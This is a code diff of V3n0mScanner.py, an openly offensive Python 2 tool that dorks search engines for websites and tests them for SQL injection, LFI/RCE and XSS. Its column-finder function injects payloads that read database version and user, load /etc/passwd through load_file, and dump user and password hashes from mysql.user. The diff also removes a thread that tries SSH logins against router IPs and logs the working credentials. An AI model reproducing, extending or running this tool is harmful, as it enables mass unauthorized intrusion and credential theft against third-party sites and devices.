@@ -52,62 +52,18 @@
 
 
 try:
-	import re, random, threading, socket, urllib2, cookielib, subprocess, codecs, signal, time, sys, os, math, itertools, hashlib, Queue
+	import re, random, threading, socket, urllib2, cookielib, subprocess, codecs, signal, time, sys, os, math, itertools
 except:
 	print " please make sure you have all of the following modules: re, random, threading, socket, urllib2, cookielib, subprocess, codecs, signal, time, sys, os, math, itertools"
 	exit()
-
-try:
-	import paramiko
-
-	PARAMIKO_IMPORTED = True
-except ImportError:
-	PARAMIKO_IMPORTED = False
-
-d0rk = [line.strip() for line in open("statics/d0rks", 'r')]
-random.shuffle(d0rk)
-header = [line.strip() for line in open("statics/header", 'r')]
-random.shuffle(header)
-xsses = [line.strip() for line in open("statics/xsses", 'r')]
-random.shuffle(xsses)
-lfis = [line.strip() for line in open("statics/lfi", 'r')]
-random.shuffle(lfis)
-
-sqlerrors = {'MySQL': 'error in your SQL syntax',
-             'MiscError': 'mysql_fetch',
-             'MiscError2': 'num_rows',
-             'Oracle': 'ORA-01756',
-             'JDBC_CFM': 'Error Executing Database Query',
-             'JDBC_CFM2': 'SQLServer JDBC Driver',
-             'MSSQL_OLEdb': 'Microsoft OLE DB Provider for SQL Server',
-             'MSSQL_Uqm': 'Unclosed quotation mark',
-             'MS-Access_ODBC': 'ODBC Microsoft Access Driver',
-             'MS-Access_JETdb': 'Microsoft JET Database',
-             'Error Occurred While Processing Request': 'Error Occurred While Processing Request',
-             'Server Error': 'Server Error',
-             'Microsoft OLE DB Provider for ODBC Drivers error': 'Microsoft OLE DB Provider for ODBC Drivers error',
-             'Invalid Querystring': 'Invalid Querystring',
-             'OLE DB Provider for ODBC': 'OLE DB Provider for ODBC',
-             'VBScript Runtime': 'VBScript Runtime',
-             'ADODB.Field': 'ADODB.Field',
-             'BOF or EOF': 'BOF or EOF',
-             'ADODB.Command': 'ADODB.Command',
-             'JET Database': 'JET Database',
-             'mysql_fetch_array()': 'mysql_fetch_array()',
-             'Syntax error': 'Syntax error',
-             'mysql_numrows()': 'mysql_numrows()',
-             'GetArray()': 'GetArray()',
-             'FetchRow()': 'FetchRow()',
-             'Input string was not in a correct format': 'Input string was not in a correct format'}
-
 
 # Banner
 def logo():
 	print R + "\n|----------------------------------------------------------------|"
 	print "|     V3n0mScanner.py                                            |"
-	print "|     Release Date 09/12/2013  - Release Version V.3.3.2         |"
+	print "|     Release Date 02/12/2013  - Release Version V.3.3.2         |"
 	print "|          						         |"
-	print "|          " + B + "   NovaCygni  Architect  " + R + "                      |"
+	print "|          " + B + "   NovaCygni  Architect  d4rkcat" + R + "                      |"
 	print "|                    _____       _____                           |"
 	print "|          " + G + "         |____ |     |  _  |    " + R + "                      |"
 	print "|             __   __   / /_ __ | |/' |_ _" + G + "_ ___             " + R + "     |"
@@ -117,11 +73,9 @@ def logo():
 	print "|    							         |"
 	print "|----------------------------------------------------------------|\n"
 
-
-def killpid(signum=0, frame=0):
+def killpid(signum = 0, frame = 0):
 	print "\r\x1b[K"
 	os.kill(os.getpid(), 9)
-
 
 def search(maxc):
 	urls = []
@@ -159,17 +113,17 @@ def search(maxc):
 						for name in names:
 							if name not in urls:
 								if re.search(r'\(', name) or re.search("<", name) or re.search("\A/",
-								                                                               name) or re.search(
+																							   name) or re.search(
 										"\A(http://)\d", name):
 									pass
 								elif re.search("google", name) or re.search("youtube", name) or re.search("phpbuddy",
-								                                                                          name) or re.search(
+																										  name) or re.search(
 										"iranhack", name) or re.search("phpbuilder", name) or re.search("codingforums",
-								                                                                        name) or re.search(
+																										name) or re.search(
 										"phpfreaks", name) or re.search("%", name) or re.search("facebook",
-								                                                                name) or re.search(
+																								name) or re.search(
 										"twitter", name) or re.search("hackforums", name) or re.search("askjeeves",
-								                                                                       name) or re.search(
+																									   name) or re.search(
 										"wordpress", name) or re.search("github", name):
 									pass
 								elif re.search(site, name):
@@ -274,43 +228,6 @@ class Xssthread(threading.Thread):
 		self.check = False
 
 
-class Router(threading.Thread):
-	"""Checks for routers running ssh with given User/Pass"""
-
-	def __init__(self, queue, user, passw):
-		if not PARAMIKO_IMPORTED:
-			print 'You need paramiko.'
-			print 'http://www.lag.net/paramiko/'
-			sys.exit(1)
-		threading.Thread.__init__(self)
-		self.queue = queue
-		self.user = user
-		self.passw = passw
-
-	def run(self):
-		"""Tries to connect to given Ip on port 22"""
-		ssh = paramiko.SSHClient()
-		ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-		while True:
-			try:
-				ip_add = self.queue.get(False)
-
-			except Queue.Empty:
-				break
-			try:
-				ssh.connect(ip_add, username=self.user, password=self.passw, timeout=10)
-				ssh.close()
-				print "Working: %s:22 - %s:%s\n" % (ip_add, self.user, self.passw)
-				write = open('Routers.txt', "a+")
-				write.write('%s:22 %s:%s\n' % (ip_add, self.user, self.passw))
-				write.close()
-				self.queue.task_done()
-
-			except:
-				print 'Not Working: %s:22 - %s:%s\n' % (ip_add, self.user, self.passw)
-				self.queue.task_done()
-
-
 def classicinj(url):
 	#noinspection PyPep8Naming,PyPep8Naming
 	EXT = "'"
@@ -372,8 +289,8 @@ def classicxss(url):
 			except:
 				if len(xss + url) < 147:
 					sys.stdout.write(
-						B + "\r\x1b[K [*] Testing %s%s" % (
-						url, xss))
+					B + "\r\x1b[K [*] Testing %s%s" % (
+					url, xss))
 					sys.stdout.flush()
 
 
@@ -438,10 +355,8 @@ def xsstest():
 			threads.append(thread)
 		for thread in threads:
 			thread.join()
-
-
+			
 def colfinder():
-	global gets, gets
 	print B + "\n[+] Preparing for Column Finder ..."
 	print "[+] Can take a while ..."
 	print "[!] Working ..."
@@ -498,7 +413,7 @@ def colfinder():
 	print B + "\n[+] Gathering MySQL Server Configuration..."
 	for site in darkurl:
 		head_URL = site.replace("evilzone",
-		                        'concat(0x1e,0x1e,version(),0x1e,user(),0x1e,database(),0x1e,0x20)') + arg_end
+								"concat(0x1e,0x1e,version(),0x1e,user(),0x1e,database(),0x1e,0x20)") + arg_end
 		print R + "\n[+] Target:", O + site
 		while 1:
 			try:
@@ -524,14 +439,14 @@ def colfinder():
 						search = re.findall("NovaCygni", source)
 						if len(search) > 0:
 							print "\n[!] w00t!w00t!: " + site.replace("evilzone",
-							                                          "load_file(0x" + file.encode("hex") + ")")
+																	  "load_file(0x" + file.encode("hex") + ")")
 
 						load = site.replace("evilzone",
-						                    "concat_ws(char(58),user,password,0x62616c74617a6172)") + arg_eva + "from" + arg_eva + "mysql.user"
+											"concat_ws(char(58),user,password,0x62616c74617a6172)") + arg_eva + "from" + arg_eva + "mysql.user"
 					source = urllib2.urlopen(load).read()
 					if re.findall("NovaCygni", source):
 						print "\n[!] w00t!w00t!: " + site.replace("evilzone",
-						                                          "concat_ws(char(58),user,password)") + arg_eva + "from" + arg_eva + "mysql.user"
+																  "concat_ws(char(58),user,password)") + arg_eva + "from" + arg_eva + "mysql.user"
 
 				print W + "\n[+] Number of tables:", len(tables)
 				print "[+] Number of columns:", len(columns)
@@ -548,7 +463,7 @@ def colfinder():
 							for column in columns:
 								try:
 									source = urllib2.urlopen(target_table.replace("0x62616c74617a6172",
-									                                              "concat_ws(char(58),0x62616c74617a6172," + column + ")")).read()
+																				  "concat_ws(char(58),0x62616c74617a6172," + column + ")")).read()
 									search = re.findall("NovaCygni", source)
 									if len(search) > 0:
 										print "\t[!] Column found: < " + column + " >"
@@ -568,39 +483,17 @@ def colfinder():
 			except(KeyboardInterrupt, SystemExit):
 				raise
 
-
-def mitmattackdectector():
-	print 'Man-in-the-Middle Attack Detection Running...'
-	devices = []
-	os.system("arp -a > temp.txt")
-	f = open('temp.txt', 'r')
-	for line in f:
-		if line.find('.255') < 0:
-			temp = line.partition('at')
-			temp2 = temp[2]
-			temp = temp2.rpartition('on')
-			temp2 = temp[0]
-			for i in devices:
-				if i == temp2:
-					print 'Alert! Possible Man-in-the-Middle Attack!'
-					print 'Attacker\'s MAC Address: ' + temp2
-			devices.append(temp2)
-		print (temp)
-		endsub = 1
-		fmenu()
-
 def fscan():
 	global maxc
 	global usearch
 	global numthreads
 	global threads
 	global finallist
-	global vuln
 	global col
 	global darkurl
 	global sitearray
 	global go
-
+	
 	threads = []
 	finallist = []
 	vuln = []
@@ -626,7 +519,7 @@ def fscan():
 			i += 1
 		for g in go:
 			print "dork: ", g
-
+	
 	numthreads = raw_input('\nEnter no. of threads : ')
 	maxc = raw_input('Enter no. of pages   : ')
 	print "\nNumber of SQL errors :", len(sqlerrors)
@@ -641,61 +534,63 @@ def fscan():
 	print "Encrypted SE    : 3"
 	print ""
 	print ""
-	print ""
-
+	
 	usearch = search(maxc)
 	vulnscan()
 
-
 def vulnscan():
 	global endsub
+	global lfi_log
+	global rce_log
+	global xss_log_file
+	global admin_log_file
+	global vuln
+
+	lfi_log_file = open("v3n0m-lfi.txt", "a")
+	rce_log_file = open("v3n0m-rce.txt", "a")
+	xss_log_file = open("v3n0m-xss.txt", "a")
+	admin_log_file = open("v3n0m-admin.txt", "a")
 	endsub = 0
+	
 	print R + "\n[1] SQLi Testing"
 	print "[2] SQLi Testing Auto Mode"
 	print "[3] LFI - RCE Testing"
 	print "[4] XSS Testing"
-	print "[5] SQLi and LFI - RCE Testing"
-	print "[6] SQLi and XSS Testing"
-	print "[7] LFI -RCE and XSS Testing"
-	print "[8] SQLi,LFI - RCE and XSS Testing"
-	print "[9] Save valid urls to file"
-	print "[10] Print valid urls"
-	print "[11] Print Found vuln in last scan"
-	print "[12] Back to main menu"
-
+	print "[5] Save valid urls to file"
+	print "[6] Print valid urls"
+	print "[7] Print Found vuln in last scan"
+	print "[8] Back to main menu"
+	
 	chce = raw_input(":")
 	if chce == '1':
+		vuln = []
 		injtest()
-		print "Scan complete, " + str(len(col)) + " vuln sites found."
+		print B + "\r\x1b[K [*] Scan complete, " + O + str(len(col)) + B + " vuln sites found."
+		print
 
 	elif chce == '2':
+		vuln = []
 		injtest()
 		colfinder()
+		endsub = 0
+		print B + "\r\x1b[K [*] Scan complete, " + O + str(len(vuln)) + B + " vuln sites found."
+		print
 
 	elif chce == '3':
+		vuln = []
 		lfitest()
-
+		endsub = 0
+		print B + "\r\x1b[K [*] Scan complete, " + O + str(len(vuln)) + B + " vuln sites found."
+		print
+		
 	elif chce == '4':
+		vuln = []
 		xsstest()
+		print B + "\r\x1b[K [*] Scan complete, " + O + str(len(vuln)) + B + " vuln sites found."
+		print
+		endsub = 0
 
 	elif chce == '5':
-		injtest()
-		lfitest()
-
-	elif chce == '6':
-		injtest()
-		xsstest()
-
-	elif chce == '7':
-		lfitest()
-		xsstest()
-
-	elif chce == '8':
-		injtest()
-		lfitest()
-		xsstest()
-
-	elif chce == '9':
 		print B + "\nSaving valid urls (" + str(len(finallist)) + ") to file"
 		listname = raw_input("Filename: ")
 		list_name = open(listname, "w")
@@ -704,30 +599,34 @@ def vulnscan():
 			list_name.write(t + "\n")
 		list_name.close()
 		print "Urls saved, please check", listname
+		endsub = 0
 
-	elif chce == '10':
+	elif chce == '6':
 		print W + "\nPrinting valid urls:\n"
 		finallist.sort()
 		for t in finallist:
 			print B + t
+		endsub = 0
 
-	elif chce == '11':
+	elif chce == '7':
 		print B + "\nVuln found ", len(vuln)
-
-	elif chce == '12':
+		print vulns
+		endsub = 0
+	
+	elif chce == '8':
 		endsub = 1
 		fmenu()
-
-
+	
 def fmenu():
+	global vuln
+	vuln = []
 	if endsub != 1:
 		vulnscan()
 	logo()
 	print "[1] Dork and vuln scan"
 	print "[2] Admin page finder"
-	print "[3] FTP crawler"
+	print "[3] FTP crawler and vuln scan"
 	print "[4] DNS brute"
-	print '[5] MITM Attack Detector'
 	print "[0] Exit\n"
 	chce = raw_input(":")
 
@@ -739,76 +638,77 @@ def fmenu():
 		afsite = raw_input("Enter the site eg target.com: ")
 		print B
 		pwd = os.path.dirname(str(os.path.realpath(__file__)))
-		findadmin = subprocess.Popen(pwd + "/modules/adminfinder.py -w modules/adminlist.txt -u " + str(afsite),
-		                             shell=True)
+		findadmin = subprocess.Popen(pwd + "/modules/adminfinder.py -w modules/adminlist.txt -u " + str(afsite), shell=True)
 		findadmin.communicate()
-
+		
 	elif chce == '3':
 		randips = raw_input("How many IP addresses do you want to scan: ")
 		print B
 		pwd = os.path.dirname(str(os.path.realpath(__file__)))
 		ftpcrawl = subprocess.Popen(pwd + "/modules/ftpcrawler.py -i " + str(randips), shell=True)
 		ftpcrawl.communicate()
-
+		
 	elif chce == '4':
 		dnstarg = raw_input("Enter the site eg target.com: ")
 		print B
 		pwd = os.path.dirname(str(os.path.realpath(__file__)))
-		dnsbrute = subprocess.Popen(pwd + "/modules/dnsbrute.py -w modules/subdomainsmid.txt -u " + str(dnstarg),
-		                            shell=True)
+		dnsbrute = subprocess.Popen(pwd + "/modules/dnsbrute.py -w modules/subdomainsmid.txt -u " + str(dnstarg), shell=True)
 		dnsbrute.communicate()
 
-	elif chce == '5':
-		print Y + ""
-		mitmattackdectector()
+	elif chce == '0':
+		print R + "\n Exiting ..."
+		mnu = False
+		print W
+		sys.exit(0)
+		
 
-	signal.signal(signal.SIGINT, killpid)
-	d0rk = [line.strip() for line in open("statics/d0rks", 'r')]
-	header = [line.strip() for line in open("statics/header", 'r')]
-	xsses = [line.strip() for line in open("statics/xsses", 'r')]
-	lfis = [line.strip() for line in open("statics/lfi", 'r')]
-	random.shuffle(d0rk)
-	random.shuffle(header)
-	random.shuffle(lfis)
+signal.signal(signal.SIGINT, killpid)
+d0rk = [line.strip() for line in open("statics/d0rks", 'r')]
+header = [line.strip() for line in open("statics/header", 'r')]
+xsses = [line.strip() for line in open("statics/xsses", 'r')]
+lfis = [line.strip() for line in open("statics/lfi", 'r')]
+random.shuffle(d0rk)
+random.shuffle(header)
+random.shuffle(lfis)
 
-	sqlerrors = {'MySQL': 'error in your SQL syntax',
-	             'MiscError': 'mysql_fetch',
-	             'MiscError2': 'num_rows',
-	             'Oracle': 'ORA-01756',
-	             'JDBC_CFM': 'Error Executing Database Query',
-	             'JDBC_CFM2': 'SQLServer JDBC Driver',
-	             'MSSQL_OLEdb': 'Microsoft OLE DB Provider for SQL Server',
-	             'MSSQL_Uqm': 'Unclosed quotation mark',
-	             'MS-Access_ODBC': 'ODBC Microsoft Access Driver',
-	             'MS-Access_JETdb': 'Microsoft JET Database',
-	             'Error Occurred While Processing Request': 'Error Occurred While Processing Request',
-	             'Server Error': 'Server Error',
-	             'Microsoft OLE DB Provider for ODBC Drivers error': 'Microsoft OLE DB Provider for ODBC Drivers error',
-	             'Invalid Querystring': 'Invalid Querystring',
-	             'OLE DB Provider for ODBC': 'OLE DB Provider for ODBC',
-	             'VBScript Runtime': 'VBScript Runtime',
-	             'ADODB.Field': 'ADODB.Field',
-	             'BOF or EOF': 'BOF or EOF',
-	             'ADODB.Command': 'ADODB.Command',
-	             'JET Database': 'JET Database',
-	             'mysql_fetch_array()': 'mysql_fetch_array()',
-	             'Syntax error': 'Syntax error',
-	             'mysql_numrows()': 'mysql_numrows()',
-	             'GetArray()': 'GetArray()',
-	             'FetchRow()': 'FetchRow()',
-	             'Input string was not in a correct format': 'Input string was not in a correct format'}
+sqlerrors = {'MySQL': 'error in your SQL syntax',
+			 'MiscError': 'mysql_fetch',
+			 'MiscError2': 'num_rows',
+			 'Oracle': 'ORA-01756',
+			 'JDBC_CFM': 'Error Executing Database Query',
+			 'JDBC_CFM2': 'SQLServer JDBC Driver',
+			 'MSSQL_OLEdb': 'Microsoft OLE DB Provider for SQL Server',
+			 'MSSQL_Uqm': 'Unclosed quotation mark',
+			 'MS-Access_ODBC': 'ODBC Microsoft Access Driver',
+			 'MS-Access_JETdb': 'Microsoft JET Database',
+			 'Error Occurred While Processing Request': 'Error Occurred While Processing Request',
+			 'Server Error': 'Server Error',
+			 'Microsoft OLE DB Provider for ODBC Drivers error': 'Microsoft OLE DB Provider for ODBC Drivers error',
+			 'Invalid Querystring': 'Invalid Querystring',
+			 'OLE DB Provider for ODBC': 'OLE DB Provider for ODBC',
+			 'VBScript Runtime': 'VBScript Runtime',
+			 'ADODB.Field': 'ADODB.Field',
+			 'BOF or EOF': 'BOF or EOF',
+			 'ADODB.Command': 'ADODB.Command',
+			 'JET Database': 'JET Database',
+			 'mysql_fetch_array()': 'mysql_fetch_array()',
+			 'Syntax error': 'Syntax error',
+			 'mysql_numrows()': 'mysql_numrows()',
+			 'GetArray()': 'GetArray()',
+			 'FetchRow()': 'FetchRow()',
+			 'Input string was not in a correct format': 'Input string was not in a correct format'}
 
 #Multithreading implementation and queueing prepared and ready, Debug support required for stability and testing
-#if __debug__:
-#   import threading as parcomp
-#   queueclass=Queue.Queue
-#   workerclass=threading.Thread
-#   NUMWORKERS=1
-#else:
-#   import multiprocessing as parcomp
-#   queueclass=parcomp.Queue
-#   workerclass=parcomp.Process
-#   NUMWORKERS=parcomp.cpu_count()
+#if __debug__:  
+#   import threading as parcomp  
+#   queueclass=Queue.Queue  
+#   workerclass=threading.Thread  
+#   NUMWORKERS=1  
+#else:  
+#   import multiprocessing as parcomp  
+#   queueclass=parcomp.Queue  
+#   workerclass=parcomp.Process  
+#   NUMWORKERS=parcomp.cpu_count()  
 
 #This is the MBCS Encoding Bypass for making MBCS encodings work on Linux - NovaCygni
 try:
@@ -824,22 +724,13 @@ R = "\033[31m"
 G = "\033[32m"
 O = "\033[33m"
 B = "\033[34m"
-Y = "\033[37m"
 
 subprocess.call("clear", shell=True)
-lfi_log = "v3n0m-lfi.txt"
-rce_log = "v3n0m-rce.txt"
-xss_log = "v3n0m-xss.txt"
-admin_log = "v3n0m-admin.txt"
-lfi_log_file = open(lfi_log, "a")
-rce_log_file = open(rce_log, "a")
-xss_log_file = open(xss_log, "a")
-admin_log_file = open(admin_log, "a")
 arg_end = "--"
 arg_eva = "+"
-colMax = 61 # Change this at your will
+colMax = 60 # Change this at your will
 endsub = 1
-gets = 0
+gets = 0
 timeout = 8
 file = "/etc/passwd"
 socket.setdefaulttimeout(timeout)
